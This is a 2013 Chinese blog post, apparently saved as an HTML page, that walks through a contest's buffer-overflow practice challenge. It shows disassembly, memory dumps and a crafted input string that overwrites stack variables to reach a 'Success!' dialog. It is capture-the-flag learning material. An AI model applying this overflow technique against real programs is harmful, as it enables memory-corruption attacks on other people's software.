@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>西电第三届网络攻防大赛线上赛缓冲区溢出题目第二关 - KoU2N‘s BLOG</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="KoU2N" /><meta name="description" content="破解一共6道题，做了前4题，第5题是linux环境下ELF文件，暂时不做了，第6题的话貌似有些难度，先放一放，刚才把缓冲区溢出的题目看了一些" /><meta name="keywords" content="KoU2N, blog, KoU2N" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.53 with even 4.0.0" />
+
+
+<link rel="canonical" href="https://kou2n.github.io/post/%E8%A5%BF%E7%94%B5%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE%E7%AC%AC%E4%BA%8C%E5%85%B3/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="西电第三届网络攻防大赛线上赛缓冲区溢出题目第二关" />
+<meta property="og:description" content="破解一共6道题，做了前4题，第5题是linux环境下ELF文件，暂时不做了，第6题的话貌似有些难度，先放一放，刚才把缓冲区溢出的题目看了一些" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://kou2n.github.io/post/%E8%A5%BF%E7%94%B5%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE%E7%AC%AC%E4%BA%8C%E5%85%B3/" /><meta property="article:published_time" content="2013-05-19T19:43:43&#43;00:00"/>
+<meta property="article:modified_time" content="2013-05-19T19:43:43&#43;00:00"/>
+
+<meta itemprop="name" content="西电第三届网络攻防大赛线上赛缓冲区溢出题目第二关">
+<meta itemprop="description" content="破解一共6道题，做了前4题，第5题是linux环境下ELF文件，暂时不做了，第6题的话貌似有些难度，先放一放，刚才把缓冲区溢出的题目看了一些">
+
+
+<meta itemprop="datePublished" content="2013-05-19T19:43:43&#43;00:00" />
+<meta itemprop="dateModified" content="2013-05-19T19:43:43&#43;00:00" />
+<meta itemprop="wordCount" content="1019">
+
+
+
+<meta itemprop="keywords" content="缓冲区溢出,shellcode,西电网络攻防大赛," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="西电第三届网络攻防大赛线上赛缓冲区溢出题目第二关"/>
+<meta name="twitter:description" content="破解一共6道题，做了前4题，第5题是linux环境下ELF文件，暂时不做了，第6题的话貌似有些难度，先放一放，刚才把缓冲区溢出的题目看了一些"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">KoU2N</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">主页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">归档</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">KoU2N</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">主页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">西电第三届网络攻防大赛线上赛缓冲区溢出题目第二关</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2013-05-19 </span>
+        <div class="post-category">
+            <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"> 信息安全 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    
+  </div>
+</div>
+    <div class="post-content">
+      <p>破解一共6道题，做了前4题，第5题是linux环境下ELF文件，暂时不做了，第6题的话貌似有些难度，先放一放，刚才把缓冲区溢出的题目看了一些，第一题是写shellcode，暂时也放一放，先把第二题的思路贴出来。
+<div class='align-center'>
+  <p><img src="1.jpg" alt="img" title="jpg" /></p>
+
+</div>
+<!-- more -->
+要求就是输入任意字符串，然后让程序弹出，成功的对话框。</p>
+
+<p>上OD，找main函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">00401010</span>  <span class="err">|&gt;</span> <span class="err">\55</span>            <span class="nf">push</span> <span class="no">ebp</span>
+<span class="err">00401011</span>  <span class="err">|.</span>  <span class="err">8</span><span class="nf">BEC</span>          <span class="no">mov</span> <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>
+<span class="err">00401013</span>  <span class="err">|.</span>  <span class="err">83</span><span class="nf">EC</span> <span class="mi">58</span>       <span class="no">sub</span> <span class="no">esp</span><span class="p">,</span><span class="mi">0x58</span>
+<span class="err">00401016</span>  <span class="err">|.</span>  <span class="err">53</span>            <span class="nf">push</span> <span class="no">ebx</span>
+<span class="err">00401017</span>  <span class="err">|.</span>  <span class="err">56</span>            <span class="nf">push</span> <span class="no">esi</span>
+<span class="err">00401018</span>  <span class="err">|.</span>  <span class="err">57</span>            <span class="nf">push</span> <span class="no">edi</span>
+<span class="err">00401019</span>  <span class="err">|.</span>  <span class="err">8</span><span class="nf">D7D</span> <span class="no">A8</span>       <span class="no">lea</span> <span class="no">edi</span><span class="p">,[</span><span class="no">local.22</span><span class="p">]</span>
+<span class="err">0040101</span><span class="nf">C</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">B9</span> <span class="mi">16000000</span>   <span class="no">mov</span> <span class="no">ecx</span><span class="p">,</span><span class="mi">0x16</span>
+<span class="err">00401021</span>  <span class="err">|.</span>  <span class="nf">B8</span> <span class="no">CCCCCCCC</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span><span class="mi">0xCCCCCCCC</span>
+<span class="err">00401026</span>  <span class="err">|.</span>  <span class="nl">F3:</span><span class="nf">AB</span>         <span class="no">rep</span> <span class="no">stos</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="no">es</span><span class="p">:[</span><span class="no">edi</span><span class="p">]</span>
+<span class="err">00401028</span>  <span class="err">|.</span>  <span class="nf">C745</span> <span class="no">FC</span> <span class="no">DDCCB</span><span class="err">&gt;</span><span class="no">mov</span> <span class="p">[</span><span class="no">local.1</span><span class="p">],</span><span class="mi">0xAABBCCDD</span>
+<span class="err">0040102</span><span class="nf">F</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">C745</span> <span class="no">F8</span> <span class="no">AADDC</span><span class="err">&gt;</span><span class="no">mov</span> <span class="p">[</span><span class="no">local.2</span><span class="p">],</span><span class="mi">0xBBCCDDAA</span>
+<span class="err">00401036</span>  <span class="err">|.</span>  <span class="nf">C745</span> <span class="no">F4</span> <span class="no">CCBBA</span><span class="err">&gt;</span><span class="no">mov</span> <span class="p">[</span><span class="no">local.3</span><span class="p">],</span><span class="mi">0xDDAABBCC</span>
+<span class="err">0040103</span><span class="nf">D</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">C745</span> <span class="no">F0</span> <span class="no">DDAAB</span><span class="err">&gt;</span><span class="no">mov</span> <span class="p">[</span><span class="no">local.4</span><span class="p">],</span><span class="mi">0xCCBBAADD</span>
+<span class="err">00401044</span>  <span class="err">|.</span>  <span class="err">66:</span><span class="nf">A1</span> <span class="mi">2</span><span class="no">C50420</span><span class="err">&gt;</span><span class="no">mov</span> <span class="no">ax</span><span class="p">,</span><span class="no">word</span> <span class="no">ptr</span> <span class="no">ds</span><span class="p">:[</span><span class="mi">0x42502C</span><span class="p">]</span>
+<span class="err">0040104</span><span class="nf">A</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">66</span><span class="p">:</span><span class="mi">8945</span> <span class="no">E8</span>    <span class="no">mov</span> <span class="no">word</span> <span class="no">ptr</span> <span class="no">ss</span><span class="p">:[</span><span class="no">ebp-0x18</span><span class="p">],</span><span class="no">ax</span>
+<span class="err">0040104</span><span class="nf">E</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">33</span><span class="no">C9</span>          <span class="no">xor</span> <span class="no">ecx</span><span class="p">,</span><span class="no">ecx</span>
+<span class="err">00401050</span>  <span class="err">|.</span>  <span class="err">894</span><span class="nf">D</span> <span class="no">EA</span>       <span class="no">mov</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="no">ss</span><span class="p">:[</span><span class="no">ebp-0x16</span><span class="p">],</span><span class="no">ecx</span>
+<span class="err">00401053</span>  <span class="err">|.</span>  <span class="err">66:894</span><span class="nf">D</span> <span class="no">EE</span>    <span class="no">mov</span> <span class="no">word</span> <span class="no">ptr</span> <span class="no">ss</span><span class="p">:[</span><span class="no">ebp-0x12</span><span class="p">],</span><span class="no">cx</span>
+<span class="err">00401057</span>  <span class="err">|.</span>  <span class="err">68</span> <span class="nf">DC5F4200</span>   <span class="no">push</span> <span class="no">exploit_.00425FDC</span>                   <span class="c">;  ASCII &#34;please input the string:&#34;
+</span><span class="c"></span><span class="mi">0040105</span><span class="no">C</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">E8</span> <span class="no">FFE80000</span>   <span class="no">call</span> <span class="no">exploit_.0040F960</span>
+<span class="err">00401061</span>  <span class="err">|.</span>  <span class="err">83</span><span class="nf">C4</span> <span class="mi">04</span>       <span class="no">add</span> <span class="no">esp</span><span class="p">,</span><span class="mi">0x4</span>
+<span class="err">00401064</span>  <span class="err">|.</span>  <span class="err">8</span><span class="nf">D55</span> <span class="no">E8</span>       <span class="no">lea</span> <span class="no">edx</span><span class="p">,[</span><span class="no">local.6</span><span class="p">]</span>
+<span class="err">00401067</span>  <span class="err">|.</span>  <span class="err">52</span>            <span class="nf">push</span> <span class="no">edx</span>
+<span class="err">00401068</span>  <span class="err">|.</span>  <span class="err">68</span> <span class="err">28504200</span>   <span class="nf">push</span> <span class="no">exploit_.00425028</span>                   <span class="c">;  ASCII &#34;%s&#34;
+</span><span class="c"></span><span class="mi">0040106</span><span class="no">D</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">E8</span> <span class="mi">7</span><span class="no">E000000</span>   <span class="no">call</span> <span class="no">exploit_.004010F0</span>
+<span class="err">00401072</span>  <span class="err">|.</span>  <span class="err">83</span><span class="nf">C4</span> <span class="mi">08</span>       <span class="no">add</span> <span class="no">esp</span><span class="p">,</span><span class="mi">0x8</span>
+<span class="err">00401075</span>  <span class="err">|.</span>  <span class="err">817</span><span class="nf">D</span> <span class="no">FC</span> <span class="no">AADDC</span><span class="err">&gt;</span><span class="no">cmp</span> <span class="p">[</span><span class="no">local.1</span><span class="p">],</span><span class="mi">0xBBCCDDAA</span> 
+<span class="mi">0040107</span><span class="no">C</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">75</span> <span class="mi">38</span>         <span class="no">jnz</span> <span class="no">Xexploit_.004010B6</span>              <span class="err">//不能跳，跳了就失败</span>
+<span class="err">0040107</span><span class="nf">E</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">817</span><span class="no">D</span> <span class="no">F8</span> <span class="no">CCBBA</span><span class="err">&gt;</span><span class="no">cmp</span> <span class="p">[</span><span class="no">local.2</span><span class="p">],</span><span class="mi">0xDDAABBCC</span> 
+<span class="mi">00401085</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">75</span> <span class="mi">2</span><span class="no">F</span>         <span class="no">jnz</span> <span class="no">Xexploit_.004010B6</span>              <span class="err">//不能跳，跳了就失败</span>
+<span class="err">00401087</span>  <span class="err">|.</span>  <span class="err">817</span><span class="nf">D</span> <span class="no">F4</span> <span class="no">DDAAB</span><span class="err">&gt;</span><span class="no">cmp</span> <span class="p">[</span><span class="no">local.3</span><span class="p">],</span><span class="mi">0xCCBBAADD</span> 
+<span class="mi">0040108</span><span class="no">E</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">75</span> <span class="mi">26</span>         <span class="no">jnz</span> <span class="no">Xexploit_.004010B6</span>             <span class="err">//不能跳，跳了就失败</span>
+<span class="err">00401090</span>  <span class="err">|.</span>  <span class="err">817</span><span class="nf">D</span> <span class="no">F0</span> <span class="no">DDCCB</span><span class="err">&gt;</span><span class="no">cmp</span> <span class="p">[</span><span class="no">local.4</span><span class="p">],</span><span class="mi">0xAABBCCDD</span> 
+<span class="mi">00401097</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">75</span> <span class="mi">1</span><span class="no">D</span>         <span class="no">jnz</span> <span class="no">Xexploit_.004010B6</span>            <span class="err">//不能跳，跳了就失败</span>
+<span class="err">00401099</span>  <span class="err">|.</span>  <span class="err">8</span><span class="nf">BF4</span>          <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span><span class="no">esp</span>
+<span class="err">0040109</span><span class="nf">B</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">6</span><span class="no">A</span> <span class="mi">00</span>         <span class="no">push</span> <span class="mi">0x0</span>                                 <span class="c">; /Style = MB_OK|MB_APPLMODAL
+</span><span class="c"></span><span class="mi">0040109</span><span class="no">D</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">68</span> <span class="mi">1</span><span class="no">C504200</span>   <span class="no">push</span> <span class="no">exploit_.0042501C</span>                   <span class="c">; |Title = &#34;Exploit2&#34;
+</span><span class="c"></span><span class="mi">004010</span><span class="no">A2</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">68</span> <span class="no">D05F4200</span>   <span class="no">push</span> <span class="no">exploit_.00425FD0</span>                   <span class="c">; |Text = &#34;Success!&#34;
+</span><span class="c"></span><span class="mi">004010</span><span class="no">A7</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">6</span><span class="no">A</span> <span class="mi">00</span>         <span class="no">push</span> <span class="mi">0x0</span>                                 <span class="c">; |hOwner = NULL
+</span><span class="c"></span><span class="mi">004010</span><span class="no">A9</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">FF15</span> <span class="no">B4D24200</span> <span class="no">call</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="no">ds</span><span class="p">:[</span><span class="err">&lt;&amp;</span><span class="no">USER32.MessageBoxA</span><span class="err">&gt;&gt;</span><span class="c">; \MessageBoxA
+</span><span class="c"></span><span class="mi">004010</span><span class="no">AF</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">3</span><span class="no">BF4</span>          <span class="no">cmp</span> <span class="no">esi</span><span class="p">,</span><span class="no">esp</span>
+<span class="err">004010</span><span class="nf">B1</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">E8</span> <span class="mi">9</span><span class="no">A000000</span>   <span class="no">call</span> <span class="no">exploit_.00401150</span>
+<span class="err">004010</span><span class="nf">B6</span>  <span class="err">|&gt;</span>  <span class="mi">5</span><span class="no">F</span>            <span class="no">pop</span> <span class="no">edi</span>
+<span class="err">004010</span><span class="nf">B7</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">5</span><span class="no">E</span>            <span class="no">pop</span> <span class="no">esi</span>
+<span class="err">004010</span><span class="nf">B8</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">5</span><span class="no">B</span>            <span class="no">pop</span> <span class="no">ebx</span>
+<span class="err">004010</span><span class="nf">B9</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">83</span><span class="no">C4</span> <span class="mi">58</span>       <span class="no">add</span> <span class="no">esp</span><span class="p">,</span><span class="mi">0x58</span>
+<span class="err">004010</span><span class="nf">BC</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">3</span><span class="no">BEC</span>          <span class="no">cmp</span> <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>
+<span class="err">004010</span><span class="nf">BE</span>  <span class="err">|</span><span class="p">.</span>  <span class="no">E8</span> <span class="mi">8</span><span class="no">D000000</span>   <span class="no">call</span> <span class="no">exploit_.00401150</span>
+<span class="err">004010</span><span class="nf">C3</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">8</span><span class="no">BE5</span>          <span class="no">mov</span> <span class="no">esp</span><span class="p">,</span><span class="no">ebp</span>
+<span class="err">004010</span><span class="nf">C5</span>  <span class="err">|</span><span class="p">.</span>  <span class="mi">5</span><span class="no">D</span>            <span class="no">pop</span> <span class="no">ebp</span>
+<span class="err">004010</span><span class="nf">C6</span>  <span class="err">\</span><span class="p">.</span>  <span class="no">C3</span>            <span class="no">retn</span></code></pre></td></tr></table>
+</div>
+</div>
+<hr />
+
+<p>这里</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">[</span><span class="nf">local.1</span><span class="p">]</span><span class="err">对应的是</span><span class="no">cmp</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="no">ss</span><span class="p">:[</span><span class="no">ebp-0x4</span><span class="p">],</span><span class="mi">0xBBCCDDAA</span>
+<span class="err">[</span><span class="nf">local.2</span><span class="p">]</span><span class="err">对应的是</span><span class="no">cmp</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="no">ss</span><span class="p">:[</span><span class="no">ebp-0x8</span><span class="p">],</span><span class="mi">0xDDAABBCC</span>
+<span class="err">[</span><span class="nf">local.3</span><span class="p">]</span><span class="err">对应的是</span><span class="no">cmp</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="no">ss</span><span class="p">:[</span><span class="no">ebp-0xC</span><span class="p">],</span><span class="mi">0xCCBBAADD</span>
+<span class="err">[</span><span class="nf">local.4</span><span class="p">]</span><span class="err">对应的是</span><span class="no">cmp</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="no">ss</span><span class="p">:[</span><span class="no">ebp-0x10</span><span class="p">],</span><span class="mi">0xAABBCCDD</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>下面jnz就是相等时候不跳转，所以为了让jnz不跳我们必须让
+ebp-0x4地址的值为0xBBCCDDAA，剩下3个同理
+我本机的ebp是0012FF48，所以ebp-0x4就是0012FF44,ebp-0x10就是0012FF38
+这是我输入好多111111111111111111111111,后0012FF38处的hex值。
+所以我们要做的就是修改它的值。</p>
+
+<hr />
+
+<p>括弧里面是ASCII码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0012</span><span class="nf">FF38</span>  <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">31</span> <span class="mi">00</span>  <span class="err">（</span><span class="mi">111111111111111</span><span class="p">.</span><span class="err">）</span>
+<span class="err">0012</span><span class="nf">FF38</span>  <span class="no">DD</span> <span class="no">CC</span> <span class="no">BB</span> <span class="no">AA</span> <span class="no">DD</span> <span class="no">AA</span> <span class="no">BB</span> <span class="no">CC</span> <span class="no">CC</span> <span class="no">BB</span> <span class="no">AA</span> <span class="no">DD</span> <span class="no">AA</span> <span class="no">DD</span> <span class="no">CC</span> <span class="no">BB</span>  <span class="err">（萏华莳惶袒袒）</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>这样就ok但是程序读取用户输入的缓冲区是从0012FF30处开始的，所以0012FF30到0012FF38也需要我们填充，随便填点东西，我这里填19000831。</p>
+
+<p>所以最后输入：19000831萏华莳惶袒袒
+就可以了。</p>
+
+<p>上个图：
+<div class='align-center'>
+  <p><img src="2.jpg" alt="img" title="jpg" /></p>
+
+</div></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">KoU2N</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">2013-05-19</span>
+  </p>
+  
+  
+</div><footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a>
+          <a href="/tags/shellcode/">shellcode</a>
+          <a href="/tags/%E8%A5%BF%E7%94%B5%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B/">西电网络攻防大赛</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E8%A5%BF%E7%94%B5%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE%E7%AC%AC%E4%B8%89%E5%85%B3/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">西电第三届网络攻防大赛线上赛缓冲区溢出题目第三关</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/%E8%A5%BF%E7%94%B5%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E7%A0%B4%E8%A7%A3%E9%A2%98%E7%9B%AE%E7%AC%AC%E5%9B%9B%E5%85%B3/">
+            <span class="next-text nav-default">西电第三届网络攻防大赛线上赛破解题目第四关</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:gao_yun@.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/kouunn" class="iconfont icon-github" title="github"></a>
+      <a href="http://localhost:1313" class="iconfont icon-zhihu" title="zhihu"></a>
+  <a href="https://kou2n.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2017 - 
+    2019
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">KoU2N</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
